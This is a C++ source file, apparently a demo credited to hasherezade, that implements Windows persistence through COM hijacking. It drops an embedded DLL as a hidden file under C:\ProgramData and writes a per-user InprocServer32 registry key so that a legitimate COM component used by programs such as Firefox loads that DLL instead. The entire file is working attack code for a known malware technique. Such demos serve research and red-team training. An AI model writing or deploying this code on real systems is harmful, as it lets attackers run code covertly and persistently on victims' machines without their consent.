// Persistence via COM hijacking
// This is just a simple demo
// CC-BY hasherezade

#include <windows.h>
#include <stdio.h>
#include <string>
#include <shlguid.h>

#include "resource.h"
#include "sysutil.h"

//CLSID of the COM component that you want to hijack:
std::string COM_clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"; // CLSID_MMDeviceEnumerator (used i.e. by Firefox)

std::string clsidToString(const IID &clsid)
{
    OLECHAR* guidString;
    StringFromCLSID(clsid, &guidString);

    char my_clsid[MAX_PATH] = {0};
    sprintf(my_clsid, "%S", guidString);
    ::CoTaskMemFree(guidString);
    guidString = NULL;
    return my_clsid;
}

std::string makeTest()
{
    return clsidToString(CLSID_CUrlHistory);
}

bool hijackCOM32(std::string com_clsid, char *path_buffer, DWORD &val_len)
{
    printf("[*] Trying to hijack: %s\n", com_clsid.c_str());
    HKEY dstBaseKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Classes", 0, KEY_WRITE, &dstBaseKey) != ERROR_SUCCESS) {
        printf("[-] Failed to open base key!\n");
        return false;
    }

    std::string subKey = "CLSID\\" + com_clsid + "\\InprocServer32";
    if (is_system32b() == false) {
        subKey = "Wow6432Node\\" + subKey;
    }
    HKEY hDstKey = NULL;
    if (RegCreateKey(dstBaseKey, subKey.c_str(), &hDstKey) != ERROR_SUCCESS) {
        RegCloseKey(hDstKey);
        return false;
    }

    bool isSuccess = false;
    if (RegSetValueExA(hDstKey, NULL, 0, REG_SZ, (BYTE*) path_buffer, val_len) == ERROR_SUCCESS) {
        isSuccess = true;
    }
    RegCloseKey(hDstKey);
    return isSuccess;
}


bool writeToFile(char* res_data, DWORD res_size, char *payloadName)
{
    HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return false;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
    if (res_size != written) { //failed to write full buffer
            DeleteFile(payloadName);
            return false;
        }
    }
    return true;
}

BOOL dropResource(char *payloadName)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return FALSE;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return FALSE;

    char* res_data = (char*) LockResource(res_handle);
    DWORD res_size = SizeofResource(NULL, res);

    /* you can now use the resource data */

    BOOL isDropped = writeToFile(res_data, res_size, payloadName);

    /* free resource after using*/
    FreeResource(res_handle);
    return isDropped;
}

int main(int argc, char *argv[])
{
    char *path = "C:\\ProgramData\\demo.dll";
    std::string clsid = COM_clsid;
    if (argc >= 2) {
        clsid = argv[1];
    }
    if (dropResource(path) == FALSE) {
        printf("[+] DLL dropping failed!\n");
        return (-1);
    }

    printf("[+] DLL dropped!\n");

    DWORD val_len = strlen(path);
    if (hijackCOM32(clsid, path , val_len)) {
        printf("[+] COM Hijacked!\n");
    } else {
        printf("[-] COM Hijacking failed!");
    }
    system("pause");
    return 0;
}
